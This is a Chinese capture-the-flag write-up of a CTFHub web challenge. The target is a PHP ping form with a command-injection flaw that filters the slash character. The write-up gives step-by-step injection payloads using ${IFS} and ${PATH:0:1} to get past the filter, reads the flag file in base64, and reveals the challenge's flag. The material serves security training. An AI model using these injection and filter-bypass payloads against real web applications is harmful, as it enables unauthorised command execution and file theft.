【CTFHub】Web-RCE 命令注入-过滤目录分隔符 Writeup

操作者：何芊宏 | 操作日期：2026.9.26 | 分类：CTF | 标签：CTFHub, Web, RCE, 命令注入, 过滤斜杠, PATH环境变量截取

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - RCE / 命令注入
  • 题目名称：过滤目录分隔符
  • 环境：浏览器 + 输入框提交。
  • 目标：在斜杠 / 被过滤的情况下，利用环境变量截取，拼接路径并读取目标文件。

2. 解题思路与知识点

本关核心考点：Linux 环境变量截取（${PATH:0:1}）与 base64 源码读取。

知识点（比喻说明）：
  • 绕过目录分隔符： 服务器过滤了斜杠 /。我们要像变魔术一样，凭空“变”出一个斜杠。Linux 的 $PATH 环境变量（例如 /usr/local/sbin:...）的第一个字符刚好就是斜杠。通过 ${PATH:0:1} 截取第一个字符，即可完美替代 /。
  • cd 命令的失效： 在 PHP 的 exec() 中，每次执行命令都会开启一个新的子进程。用 cd 切换目录只在当前子进程有效，无法影响后续命令，所以直接拼接相对路径才是最稳妥的方案。

3. 详细步骤

第一步：源码审计与漏洞定位

<?php
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/\//", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

代码逐行解析：

  • preg_match_all("/\//", $ip, $m)：过滤了斜杠字符 /。
  • 没有过滤空格，所以我们可以直接用空格或 ${IFS}。

第二步：探测真实目标目录

Payload： 127.0.0.1;ls

回显结果：发现当前目录下存在 flag_is_here 和 index.php。

获得信息：目标目录名为 flag_is_here，且位于相对路径下。

第三步：进入目录查看内部文件

Payload： 127.0.0.1;ls${IFS}flag_is_here

回显结果：发现真正目标文件为 flag_32623325639701.php。

第四步：拼接路径，使用 base64 读取源码

Payload： 127.0.0.1;base64${IFS}flag_is_here${PATH:0:1}flag_32623325639701.php

为什么要输入：${PATH:0:1} 会被解析为斜杠，拼接出正确路径 flag_is_here/flag_32623325639701.php。使用 base64 避免内容被 PHP 解析器“隐形”。

回显结果：得到 Base64 字符串 PD9waHAgLy8gY3RmaHViezkyNjU2NThkOTBjZmM5MTQyNGY5MmJiZ...

操作： 将字符串复制到在线工具 https://base64.us 进行解码。

解码结果：<?php // ctfhub{9265658d90cfc91424f92bbe}

4. 踩坑记录与复盘

  • 尝试直接读取 /flag 导致无回显： 误以为 Flag 在根目录下，使用 cat${IFS}${PATH:0:1}flag 却毫无回显。使用 2>&1 排错后发现根目录根本没有 /flag 目录。教训：必须先用 ls 一级一级确认路径，不能盲目猜测。
  • cd 命令失效的陷阱： 尝试用 127.0.0.1;cd${IFS}flag_is_here;ls 进入目录，发现没有任何输出。原因是 PHP 的 exec() 函数每次执行都在新的子进程中，cd 无法影响后续命令。教训：在命令注入中，直接使用相对路径（如 ls dir）比依赖 cd 更可靠。
  • 关于 /**/ 替代空格的误区（延续上一关）： 这是典型的 SQL 注入思维。在 Linux Shell 中，/ 和 * 会被识别为路径和通配符，无法替代空格。命令注入中替代空格必须用 ${IFS} 或 <。

5. 知识总结

  • 环境变量截取神器： ${PATH:0:1} 和 ${PWD:0:1} 都是完美的斜杠替代品，能在过滤 / 时起到决定性作用。
  • Web 读源码的黄金组合： 当读取 .php 后缀的文件时，优先使用 base64 命令编码，再拿到本地解码，这是防止源码被 HTML 解析隐藏的最佳实践。
